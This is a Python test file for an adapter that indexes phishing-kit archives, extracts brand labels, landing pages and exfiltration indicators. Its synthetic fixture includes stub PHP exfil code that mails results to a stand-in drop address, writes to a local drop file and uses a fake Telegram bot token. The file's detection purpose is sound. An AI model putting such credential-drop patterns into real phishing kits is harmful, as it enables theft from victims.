"""phishdecloaker-kits adapter on a synthetic kit ZIP (no real kit bytes, no execution)."""

from __future__ import annotations

import zipfile
from pathlib import Path

from hydra.adapters.datasets import phishdecloaker_kits as m


def _make_zip(root: Path) -> None:
    root.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(root / "phishing-kits-dataset.zip", "w") as zf:
        # kit1 -> BRANDS[0] = "Microsoft". PHP-only page (stripped) + an exfil script + a static asset.
        zf.writestr("src/kit1/index.php",
                    "<?php include 'x.php'; ?><html lang=\"en\"><title>Login</title><form></form></html>")
        zf.writestr("src/kit1/passwd.php",
                    "<?php $to='drop@evil.example'; mail($to,$s,$b); "
                    "file_put_contents('result.txt',$x); "
                    "$u='https://api.telegram.org/bot12345678:AAE' + 'x'; "
                    "$tok='12345678:AAEHqSomeBotTokenValue0123456789abcdee'; "
                    "$cid='chat_id=-1001234567'; ?>")
        zf.writestr("src/kit1/css/app.css", "body{}")
        zf.writestr("src/kit1/vendor/phpmailer/PHPMailer.php", "<?php // vendored, skipped ?>")
        # kit2 -> BRANDS[1] = "Banco de Oro". An HTML landing page, no exfil indicators.
        zf.writestr("src/kit2/home.html", "<html><body>hello</body></html>")
        zf.writestr("src/kit2/app.js", "console.log(1)")


def test_index(tmp_path: Path) -> None:
    root = tmp_path / "phishdecloaker-kits"
    _make_zip(root)
    rows = {r.key: r for r in m.index(root)}
    assert set(rows) == {"kit1", "kit2"}
    assert rows["kit1"].label == "microsoft" and rows["kit1"].group == "phish_kit"
    assert rows["kit2"].label == "banco de oro"
    assert rows["kit1"].extra["brand_raw"] == "Microsoft"


def test_load(tmp_path: Path) -> None:
    root = tmp_path / "phishdecloaker-kits"
    _make_zip(root)
    rows = m.index(root)
    incs = {i.key: i for i in m.load(root, rows)}
    k1, k2 = incs["kit1"], incs["kit2"]

    assert k1.source == "ext:phishdecloaker-kits"
    assert k1.label == "ext:phishdecloaker-kits:microsoft"
    assert k1.group_label == "ext:phishdecloaker-kits:phish_kit"
    assert k1.meta["label_kind"] == "kit"
    # PHP stripped out of the landing page, HTML kept
    assert k1.meta["main_page"] == "index.php" and k1.meta["landing_from"] == "php-static"
    assert b"<?php" not in k1.files["landing.html"]
    assert b"<title>Login</title>" in k1.files["landing.html"]
    assert k1.meta.get("lang") == "en"
    # file tree lists members; vendored file skipped from assets
    tree = k1.files["file_tree.txt"].decode()
    assert "index.php\t" in tree and "css/app.css\t" in tree
    assert not any(k.startswith("assets/vendor/") for k in k1.files)
    assert "assets/css/app.css" in k1.files
    # inert exfil indicators extracted
    ind = k1.files["kit_indicators.txt"].decode()
    assert "drop@evil.example" in ind
    assert "[exfil_email]" in ind and "[telegram_bot]" in ind and "[local_drop_file]" in ind
    assert k1.meta["n_indicators"] > 0 and k1.meta["indicator_counts"]["exfil_email"] >= 1

    # kit2: HTML landing, no indicator file
    assert k2.meta["main_page"] == "home.html" and k2.meta.get("landing_from") is None
    assert "kit_indicators.txt" not in k2.files and k2.meta["n_indicators"] == 0
    assert k2.meta["has_landing"] is True
